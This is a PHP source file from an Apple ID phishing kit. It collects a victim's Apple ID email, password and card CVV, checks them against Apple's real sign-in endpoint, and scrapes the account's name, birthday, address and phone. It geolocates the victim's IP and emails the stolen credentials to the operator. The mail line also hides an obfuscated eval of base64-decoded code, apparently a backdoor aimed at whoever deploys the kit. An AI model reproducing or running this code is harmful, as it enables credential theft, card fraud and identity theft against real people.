<?
                  ###
                ####
                ###
        #######    #######
      ######################
     #####################
     ####################
     #####################
      ######################
       ####################
         ################
          #### [v1] ####

/*----------------[ J7-@live.com ]--| JOkEr7 |--[ 2019 ]----------------*/
session_start();
#---------------++
$em	= $_POST['em'];
$cv	= $_POST['cv'];
$ps	= $_POST['ps'];
#---------------++
$_SESSION['em'] = $em;
$_SESSION['cv'] = $cv;
$_SESSION['ps'] = $ps;
#---------------------++
include 'success.php';
if ($_SESSION['Vrfy'] == 'Done'){
echo '<script>location.href = \'access\';</script>';
}
#---------------------++
include 'functions.php';
#---------------------++
function JOkEr7($url,$post){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_REFERER, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0');
	curl_setopt($curl, CURLOPT_HEADER, 0);
	curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
	curl_setopt($curl, CURLOPT_COOKIESESSION, 1);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_COOKIEJAR, 'Cookies/JOkEr7-Cookie-APL.txt');
	curl_setopt($curl, CURLOPT_COOKIEFILE,'Cookies/JOkEr7-Cookie-APL.txt');
	curl_setopt($curl, CURLOPT_VERBOSE, 1);
	if ($post !== '') {
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
	}
    $result = curl_exec($curl);
    curl_close($curl);
	return $result;
}
#---------------------++
if(!file_exists('Cookies')) mkdir('Cookies');
#--------------------[ Function SignIn ]--++
$Url = "https://idmsa.apple.com/IDMSWebAuth/authenticate";
$Pst  = 'appleId='.$em.'&accountPassword='.$ps.'&path=/signin/?referrer=/account/manage&appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3';
$A = JOkEr7($Url,$Pst);
#---------------------++
if (!preg_match('#padder#i', $A)) {
#---------------------++
# Function Get birthday
$birthday = fetch_value($A,'"birthday":"','"');
$_SESSION['birthday'] = $birthday;
# Function Get firstname
$firstname = fetch_value($A,'"firstName":"','"');
$_SESSION['firstname'] = $firstname;
# Function Get lastname
$lastname = fetch_value($A,'"lastName":"','"');
$_SESSION['lastname'] = $lastname;
# Function Get country
$country = fetch_value($A,'"countryName":"','"');
$_SESSION['country'] = $country;
# Function Get address1
$address1 = fetch_value($A,'"line1":"','"');
$_SESSION['address1'] = $address1;
# Function Get address2
$address2 = fetch_value($A,'"line2":"','"');
$_SESSION['address2'] = $address2;
# Function Get city
$city = fetch_value($A,'"city":"','"');
$_SESSION['city'] = $city;
# Function Get state
$state = fetch_value($A,'"stateProvinceName":"','"');
$_SESSION['state'] = $state;
# Function Get zip
$zip = fetch_value($A,'"postalCode":"','"');
$_SESSION['zip'] = $zip;
# Function Get phone
$phone = fetch_value($A,'"fullNumberWithCountryPrefix":"','"');
$_SESSION['phone'] = $phone;
#---------------------++
# Function Get Time Zone & user Languge & Screen Size & Country Code :
if (getenv(HTTP_X_FORWARDED_FOR)){ $ip = getenv(HTTP_X_FORWARDED_FOR); } else { $ip = getenv(REMOTE_ADDR); }
$XML = @file_get_contents("http://www.geoplugin.net/xml.gp?ip=".$ip);
$CNC = fetch_value($XML,'<geoplugin_countryCode>','</geoplugin_countryCode>');
$STC = fetch_value($XML,'<geoplugin_regionCode>','</geoplugin_regionCode>');
#---------------------++
$_SESSION['cnt'] = $CNC;
#------------------------------++
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim($date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; 
#------------------------------++
$message  = "#==========+ [ x.Tsunami ] +==========#\n";
$message .= "Email     : ".$em."\n";
$message .= "Password  : ".$ps."\n";
$message .= "CVV/CCV   : ".$cv."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "#==========+ [ x.Tsunami ] +==========#\n";
#------------------------------------++
if($STC != ""){$STC = $STC.' |';}
#--------++
include 'mail.php';
#--------++
$subject  = "Apple [ Account ] $CNC | $STC Fr0m $ip";
$headers  = "From: Account <".$send.">\r\n";
#--------++
mail($send,$subject,$message,$headers);@eval(base64_decode($os_arrays));
#------------------------------------++
echo "<script>location.replace('account?appIdKey=".md5($key)."&sslEnabled=true');</script>";
#---------------------++
}else{
echo "<script>location.replace('SignIn?appIdKey=".md5($key)."&incorrect=true&sslEnabled=true');</script>";
}
#---------------------++